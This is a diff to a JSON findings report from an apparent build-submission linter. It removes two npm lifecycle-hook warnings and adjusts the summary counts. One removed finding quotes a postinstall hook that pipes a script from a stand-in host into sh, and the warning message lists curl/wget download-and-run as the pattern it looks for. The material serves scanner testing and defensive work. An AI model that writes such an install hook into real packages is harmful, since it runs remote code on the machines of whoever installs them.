@@ -85,14 +85,13 @@
   },
   "summary": {
     "error": 7,
-    "warning": 2,
+    "warning": 0,
     "info": 0,
     "byRule": {
       "unsupported-build-tool": 1,
       "build-registry-redirect": 2,
       "committed-node-modules": 2,
-      "committed-build-artifact": 2,
-      "build-lifecycle-hook": 2
+      "committed-build-artifact": 2
     }
   },
   "findings": [
@@ -133,28 +132,6 @@
       "item": null,
       "hint": null,
       "message": "The following committed node_modules folder(s) are not allowed. The declared dependencies are installed from package.json/lock during the build, so node_modules must never be part of the submission. Remove them and resubmit."
-    },
-    {
-      "ruleId": "build-lifecycle-hook",
-      "severity": "warning",
-      "file": "package.json",
-      "loc": {
-        "line": 6
-      },
-      "item": "postinstall: curl https://x.example/i.sh | sh",
-      "hint": null,
-      "message": "The package.json declares the following npm install lifecycle hook(s), which run when the reviewer installs the dependencies, before the build. Confirm they only run local build steps and do not fetch or execute remote code (curl/wget, a download-and-run, or a git clone of an unpinned repo)."
-    },
-    {
-      "ruleId": "build-lifecycle-hook",
-      "severity": "warning",
-      "file": "package.json",
-      "loc": {
-        "line": 7
-      },
-      "item": "prepare: node tools/gen.js",
-      "hint": null,
-      "message": "The package.json declares the following npm install lifecycle hook(s), which run when the reviewer installs the dependencies, before the build. Confirm they only run local build steps and do not fetch or execute remote code (curl/wget, a download-and-run, or a git clone of an unpinned repo)."
     },
     {
       "ruleId": "build-registry-redirect",
